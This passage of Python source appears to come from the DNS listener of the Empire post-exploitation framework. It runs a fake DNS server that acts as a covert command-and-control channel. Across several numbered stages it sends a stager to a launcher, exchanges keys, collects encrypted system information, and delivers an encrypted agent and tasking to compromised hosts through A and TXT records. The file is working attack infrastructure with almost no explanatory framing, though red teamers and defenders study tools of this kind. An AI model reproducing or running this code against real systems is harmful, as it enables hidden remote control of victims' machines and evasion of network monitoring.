                        dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, addr), sender='listeners/dns')

                        # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                        agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
                        encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, zlib.compress(agentCode,9))
                        # TODO: wrap ^ in a routing packet?
                        self.send_payload_via_txt_test(sock, encryptedAgent, txtstoptransfer)
                        
    def start_server(self, listenerOptions):
        """
        Threaded function that starts the faux DNS server
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        bindIP = listenerOptions['BindIP']['Value']
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']
        ipstagetolauncher = listenerOptions['IPStagetoLauncher']['Value']
        ipnop = listenerOptions['IPNOP']['Value']
        ipswitchatotxt = listenerOptions['IPSwitchAtoTXT']['Value']
        ipack = listenerOptions['IPACK']['Value']
        ipeof = listenerOptions['IPEOF']['Value']
        ipns1 = listenerOptions['IPNS1']['Value']
        ipns2 = listenerOptions['IPNS2']['Value']
        ns1hostname = listenerOptions['NS1Hostname']['Value']
        ns2hostname = listenerOptions['NS2Hostname']['Value']
        stageonehostname = listenerOptions['StageOneHostname']['Value']
        stagetwohostname = listenerOptions['StageTwoHostname']['Value']
        stagethreehostname = listenerOptions['StageThreeHostname']['Value']
        stagefourhostname = listenerOptions['StageFourHostname']['Value']
        stagefivehostname = listenerOptions['StageFiveHostname']['Value']
        stagesixhostname = listenerOptions['StageSixHostname']['Value']                
        taskinghostname = listenerOptions['TaskingHostname']['Value']
        taskingtxthostname = listenerOptions['TaskingTXTHostname']['Value']
        txtstoptransfer = listenerOptions['TXTStopTransfer']['Value']
        astoptransfer = listenerOptions['AStopTransfer']['Value']
        fake_domain = listenerOptions['FakeDomain']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        stageone_results = ""
        stagethree_results = ""
        stagefive_results  = ""
        tasking_results = ""
        txtstoptransfer = txtstoptransfer + '.' + fake_domain
        
        # start DNS server here
        print helpers.color('[+] listeners/dns start_server(): starting the server')
        sock = socket(AF_INET, SOCK_DGRAM)
        sock.bind((bindIP, port))
        
        try:
            while True:
                request, addr = sock.recvfrom(512)
                print helpers.color('[+] listeners/dns start_server(): received pkt') 
                dns = DNS(request)
                #print "DNS type {}".format(dns[DNSQR].qtype
                if 'DNSQR' in dns:
                    host = str(dns[DNSQR].qname)
                    #print "Received hostname {}".format(host)
                    if dns[DNSQR].qtype == 1:
                        print "DNS query of type A recv'd"
                        # DNS server functionality: answer NS & A record requests for our nameservers
                        if host.startswith(ns1hostname):
                            self.send_a_record_reply_id(sock, host, ipns1, addr, dns.id, dns.qd)
                        elif host.startswith(fake_domain):
                            self.send_a_record_reply_id(sock, host, ipns1, addr, dns.id, dns.qd)
                        elif host.startswith(ns2hostname):
                            self.send_a_record_reply_id(sock, host, ipns2, addr, dns.id, dns.qd)
                        # Stage 1 (Trigger download of stager to launcher)
                        elif host.startswith(stageonehostname):
                            print "[STAGE 1]"
                            stageone_results = self.trigger_staging(sock, host, ipstagetolauncher, addr, dns.id, dns.qd)
                        # Stage 3 (Process client DH key) 
                        elif host.startswith(stagethreehostname):
                            print "[STAGE 3]"
                            stagethree_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
                        # Stage 5 (Process encrypted nonce + sysinfo)
                        elif host.startswith(stagefivehostname):
                            print "[STAGE 5]"
                            stagefive_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
                        # Tasking
                        elif host.startswith(taskinghostname):
                            print "[TASKING A]"
                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, dns.id, dns.qd)
                        else:
                            self.default_response()
                    elif dns[DNSQR].qtype == 16:
                        print "DNS query of type TXT recv'd"
                        # Stage 2 (Transfer stager to launcher)
                        if host.startswith(stagetwohostname + '0'):
                            print "[STAGE 2]"
                            self.send_stager_to_launcher(sock, host, addr, stagingKey, stageone_results, listenerOptions, txtstoptransfer, dns.id, dns.qd)
                        # Stage 4 (Transfer listener DH key to stager)
                        elif host.startswith(stagefourhostname + '.'):
                            print "[STAGE 4]"
                            self.send_crypto_to_stager(host, sock, stagingKey, listenerOptions, stagethree_results, addr, ipack, txtstoptransfer, dns.id, dns.qd)
                        # Stage 6 (Transfer agent to stager)
                        elif host.startswith(stagesixhostname):
                            print "[STAGE 6]"
                            self.send_agent_to_stager(host, stagingKey, sock, stagefive_results, listenerOptions, addr, ipack, txtstoptransfer, dns.id, dns.qd)
                        # Transfer tasking to agent
                        elif host.startswith(taskingtxthostname):
                            print "[TASKING TXT]"
                            self.process_tasking_txt(host, sock, tasking_results, addr, ipack, txtstoptransfer, dns.id, dns.qd)
                    elif dns[DNSQR].qtype == 2:
                        # NS request recvd
                        print "NS query received"
                        if host.startswith(fake_domain):
                            self.send_ns_response(fake_domain, ns1hostname, ipns1, addr, sock, dns.id, dns.qd)
                    else:
                        self.default_response()
        except (KeyboardInterrupt, SystemExit):
            # Don't kill the thread; instead stop the server.
            sock.close()
            sock.shutdown()
            sys.exit()
            
    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            # Daemonize the thread so Empire can exit gracefully
            self.threads[name].daemon = True
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()
